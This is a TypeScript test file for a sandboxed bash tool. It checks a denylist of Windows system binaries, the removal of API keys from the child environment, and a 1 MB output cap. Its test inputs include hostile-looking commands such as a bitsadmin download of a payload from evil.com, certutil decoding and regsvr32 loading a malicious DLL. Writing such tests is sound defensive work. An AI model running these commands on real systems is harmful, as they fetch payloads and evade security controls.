/**
 * Bash Sandboxing Tests — SEC-004: Denylist, env sanitization, output cap
 *
 * Tests:
 * 1. Denied binaries are blocked (powershell, certutil, etc.)
 * 2. Denied binaries in pipelines are blocked
 * 3. Safe commands are allowed (ls, git, echo, etc.)
 * 4. ANTHROPIC_API_KEY not in child process env
 * 5. Output truncation at 1MB limit
 * 6. checkDeniedBinaries unit tests
 * 7. createSanitizedEnv unit tests
 * 8. truncateOutput unit tests
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { createSystemTools, checkDeniedBinaries, createSanitizedEnv, truncateOutput, DENIED_BINARIES, SENSITIVE_ENV_VARS, MAX_OUTPUT_SIZE } from '../src/system-tools.js';
import type { ToolDefinition } from '../src/tools.js';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';

describe('Bash Sandboxing (SEC-004)', () => {
  let workspace: string;
  let tools: ToolDefinition[];

  beforeEach(() => {
    workspace = fs.mkdtempSync(path.join(os.tmpdir(), 'waggle-sandbox-test-'));
    tools = createSystemTools(workspace);
  });

  afterEach(async () => {
    for (let i = 0; i < 5; i++) {
      try {
        fs.rmSync(workspace, { recursive: true, force: true });
        return;
      } catch {
        await new Promise((r) => setTimeout(r, 200));
      }
    }
  });

  function getTool(name: string): ToolDefinition {
    const tool = tools.find((t) => t.name === name);
    if (!tool) throw new Error(`Tool "${name}" not found`);
    return tool;
  }

  describe('denylist enforcement', () => {
    it('blocks powershell commands', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'powershell echo hello' });
      expect(result).toContain('Blocked');
      expect(result).toContain('powershell');
    });

    it('blocks pwsh commands', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'pwsh -c "echo test"' });
      expect(result).toContain('Blocked');
      expect(result).toContain('pwsh');
    });

    it('blocks certutil in a pipeline', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'echo hello | certutil' });
      expect(result).toContain('Blocked');
      expect(result).toContain('certutil');
    });

    it('blocks cmd.exe', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'cmd.exe /c dir' });
      expect(result).toContain('Blocked');
      expect(result).toContain('cmd.exe');
    });

    it('blocks mshta', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'mshta javascript:alert(1)' });
      expect(result).toContain('Blocked');
      expect(result).toContain('mshta');
    });

    it('blocks rundll32', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'rundll32 some.dll' });
      expect(result).toContain('Blocked');
      expect(result).toContain('rundll32');
    });

    it('blocks wscript', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'wscript evil.vbs' });
      expect(result).toContain('Blocked');
      expect(result).toContain('wscript');
    });

    it('blocks cscript', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'cscript evil.vbs' });
      expect(result).toContain('Blocked');
      expect(result).toContain('cscript');
    });

    it('blocks bitsadmin', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'bitsadmin /transfer download http://evil.com/payload.exe' });
      expect(result).toContain('Blocked');
      expect(result).toContain('bitsadmin');
    });

    it('blocks regsvr32', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'regsvr32 /s /n malicious.dll' });
      expect(result).toContain('Blocked');
      expect(result).toContain('regsvr32');
    });

    it('blocks case-insensitive variations', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'PoWeRsHeLl echo hello' });
      expect(result).toContain('Blocked');
    });

    it('blocks denied binary embedded in arguments', async () => {
      const bash = getTool('bash');
      // certutil appears in the command even though not at start
      const result = await bash.execute({ command: 'echo "test" && certutil -decode input output' });
      expect(result).toContain('Blocked');
      expect(result).toContain('certutil');
    });
  });

  describe('safe commands allowed', () => {
    it('allows ls -la', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'echo safe_command' });
      expect(result).not.toContain('Blocked');
      expect(result.trim()).toBe('safe_command');
    });

    it('allows git status', async () => {
      const bash = getTool('bash');
      // git init first to avoid errors
      await bash.execute({ command: 'git init' });
      const result = await bash.execute({ command: 'git status' });
      expect(result).not.toContain('Blocked');
    });

    it('allows echo with no denylist matches', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'echo hello world' });
      expect(result).not.toContain('Blocked');
      expect(result.trim()).toBe('hello world');
    });

    it('allows node --version command', async () => {
      const bash = getTool('bash');
      const result = await bash.execute({ command: 'node --version' });
      expect(result).not.toContain('Blocked');
      expect(result.trim()).toMatch(/^v\d+/);
    });
  });

  describe('environment sanitization', () => {
    it('strips ANTHROPIC_API_KEY from child env', async () => {
      // Set the env var temporarily
      const originalKey = process.env.ANTHROPIC_API_KEY;
      process.env.ANTHROPIC_API_KEY = 'sk-test-secret-key-12345';

      try {
        const bash = getTool('bash');
        const isWindows = process.platform === 'win32';
        const cmd = isWindows
          ? 'echo %ANTHROPIC_API_KEY%'
          : 'echo $ANTHROPIC_API_KEY';
        const result = await bash.execute({ command: cmd });
        // The var should be empty/undefined in the child process
        expect(result.trim()).not.toContain('sk-test-secret-key-12345');
      } finally {
        if (originalKey !== undefined) {
          process.env.ANTHROPIC_API_KEY = originalKey;
        } else {
          delete process.env.ANTHROPIC_API_KEY;
        }
      }
    });

    it('strips OPENAI_API_KEY from child env', async () => {
      const originalKey = process.env.OPENAI_API_KEY;
      process.env.OPENAI_API_KEY = 'sk-openai-test-secret';

      try {
        const bash = getTool('bash');
        const isWindows = process.platform === 'win32';
        const cmd = isWindows
          ? 'echo %OPENAI_API_KEY%'
          : 'echo $OPENAI_API_KEY';
        const result = await bash.execute({ command: cmd });
        expect(result.trim()).not.toContain('sk-openai-test-secret');
      } finally {
        if (originalKey !== undefined) {
          process.env.OPENAI_API_KEY = originalKey;
        } else {
          delete process.env.OPENAI_API_KEY;
        }
      }
    });
  });

  describe('checkDeniedBinaries (unit)', () => {
    it('returns null for safe commands', () => {
      expect(checkDeniedBinaries('echo hello')).toBeNull();
      expect(checkDeniedBinaries('git status')).toBeNull();
      expect(checkDeniedBinaries('ls -la')).toBeNull();
      expect(checkDeniedBinaries('npm install')).toBeNull();
    });

    it('returns the matched binary name for denied commands', () => {
      expect(checkDeniedBinaries('powershell echo hi')).toBe('powershell');
      expect(checkDeniedBinaries('echo x | certutil')).toBe('certutil');
      expect(checkDeniedBinaries('mshta evil.hta')).toBe('mshta');
    });

    it('is case-insensitive', () => {
      expect(checkDeniedBinaries('POWERSHELL test')).toBe('powershell');
      expect(checkDeniedBinaries('CertUtil -decode')).toBe('certutil');
    });

    it('covers all denied binaries', () => {
      for (const bin of DENIED_BINARIES) {
        expect(checkDeniedBinaries(`some command ${bin} args`)).toBe(bin);
      }
    });
  });

  describe('createSanitizedEnv (unit)', () => {
    it('removes sensitive environment variables', () => {
      // Set some sensitive vars
      const originals: Record<string, string | undefined> = {};
      for (const key of SENSITIVE_ENV_VARS) {
        originals[key] = process.env[key];
        process.env[key] = `test-${key}-value`;
      }

      try {
        const env = createSanitizedEnv();
        for (const key of SENSITIVE_ENV_VARS) {
          expect(env[key]).toBeUndefined();
        }
      } finally {
        // Restore
        for (const key of SENSITIVE_ENV_VARS) {
          if (originals[key] !== undefined) {
            process.env[key] = originals[key];
          } else {
            delete process.env[key];
          }
        }
      }
    });

    it('preserves non-sensitive environment variables', () => {
      const env = createSanitizedEnv();
      // PATH should still be present
      expect(env.PATH || env.Path).toBeDefined();
    });
  });

  describe('truncateOutput (unit)', () => {
    it('returns short output unchanged', () => {
      expect(truncateOutput('hello')).toBe('hello');
      expect(truncateOutput('')).toBe('');
    });

    it('truncates output exceeding MAX_OUTPUT_SIZE', () => {
      const bigOutput = 'x'.repeat(MAX_OUTPUT_SIZE + 1000);
      const truncated = truncateOutput(bigOutput);
      expect(truncated.length).toBeLessThan(bigOutput.length);
      expect(truncated).toContain('[output truncated');
      expect(truncated).toContain('1 MB limit');
    });

    it('does not truncate output at exactly MAX_OUTPUT_SIZE', () => {
      const exactOutput = 'x'.repeat(MAX_OUTPUT_SIZE);
      expect(truncateOutput(exactOutput)).toBe(exactOutput);
    });
  });

  describe('constants', () => {
    it('MAX_OUTPUT_SIZE is 1 MB', () => {
      expect(MAX_OUTPUT_SIZE).toBe(1024 * 1024);
    });

    it('DENIED_BINARIES contains expected entries', () => {
      expect(DENIED_BINARIES).toContain('powershell');
      expect(DENIED_BINARIES).toContain('pwsh');
      expect(DENIED_BINARIES).toContain('cmd.exe');
      expect(DENIED_BINARIES).toContain('certutil');
      expect(DENIED_BINARIES).toContain('bitsadmin');
      expect(DENIED_BINARIES).toContain('mshta');
      expect(DENIED_BINARIES).toContain('regsvr32');
      expect(DENIED_BINARIES).toContain('rundll32');
      expect(DENIED_BINARIES).toContain('wscript');
      expect(DENIED_BINARIES).toContain('cscript');
    });

    it('SENSITIVE_ENV_VARS contains expected entries', () => {
      expect(SENSITIVE_ENV_VARS).toContain('ANTHROPIC_API_KEY');
      expect(SENSITIVE_ENV_VARS).toContain('OPENAI_API_KEY');
      expect(SENSITIVE_ENV_VARS).toContain('CLERK_SECRET_KEY');
      expect(SENSITIVE_ENV_VARS).toContain('DATABASE_URL');
      expect(SENSITIVE_ENV_VARS).toContain('REDIS_URL');
    });
  });
});
